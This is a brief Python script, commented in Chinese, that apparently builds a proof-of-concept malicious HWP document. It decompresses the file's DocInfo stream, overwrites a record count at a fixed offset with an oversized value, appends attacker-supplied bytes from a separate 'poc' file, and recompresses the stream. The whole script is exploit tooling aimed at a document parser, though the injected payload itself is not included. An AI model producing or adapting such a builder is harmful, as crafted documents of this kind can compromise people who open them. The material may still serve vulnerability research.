# coding:utf-8

import zlib

def decompress(infile, dstfile="./DocInfo.bin"):
    """
    docinfo.bin 是将从old_hwp_file中提取的docinfo经过解压缩的内容
    """
    fr = open(infile, "rb")
    indata = fr.read()
    fw = open(dstfile, "wb")
    outdata = zlib.decompress(indata, -15)
    fw.write(outdata)

    fr.close()
    fw.close()
    return dstfile


def compress(infile, dstfile="./docinfo.compress"):
    fr = open(infile, "rb")
    indata = fr.read()
    fw = open(dstfile, "wb")

    deflate_compress = zlib.compressobj(9, zlib.DEFLATED, -15)
    outdata = deflate_compress.compress(indata)+deflate_compress.flush()
    print ("new compressed size is", len(outdata))

    fw.write(outdata)
    fr.close()
    fw.close()
    return dstfile

# 读取 DocInfo, 并解压
# 修改count, 并自定义poc数据
# 压缩到 docinfo.new 文件

def add_poc():
    poc_file = "poc.str"
    count_position = 0x2e1b
    with open("DocInfo.bin", 'rb') as docinfo:
        docinfo_data = docinfo.read()

    with open(poc_file, "rb") as fo:
        poc_str = fo.read()

    new_docinfo_data = docinfo_data[:count_position]
    new_docinfo_data += b"\x12\x00\x00\x90"
    new_docinfo_data += poc_str
    print("new_docinfo_data size is ",len(new_docinfo_data))
    # new_docinfo_data += docinfo_data[count_position+4+len(poc_str):]
    with open("DocInfo.bin.new", 'wb') as fw:
        fw.write(new_docinfo_data)

    return compress("DocInfo.bin.new")

def run():
    decompress("DocInfo")
    add_poc()

if __name__ == '__main__':
    run()